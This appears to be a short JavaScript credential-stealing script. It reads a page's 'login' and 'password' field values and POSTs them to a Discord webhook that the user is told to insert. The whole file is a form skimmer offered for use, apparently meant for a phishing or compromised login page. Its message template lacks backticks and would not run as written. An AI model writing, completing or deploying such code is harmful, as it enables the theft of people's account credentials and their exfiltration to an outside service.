const whurl ="" //insert discord webhook here



var theInput = document.getElementById("login").value;
var pass = document.getElementById("password").value;

const msg = {
    "content": ${theInput}  ${pass}
}

fetch(whurl, {"method":"POST", 
"headers": {"content-type": "application/json"},
"body": JSON.stringify(msg)})
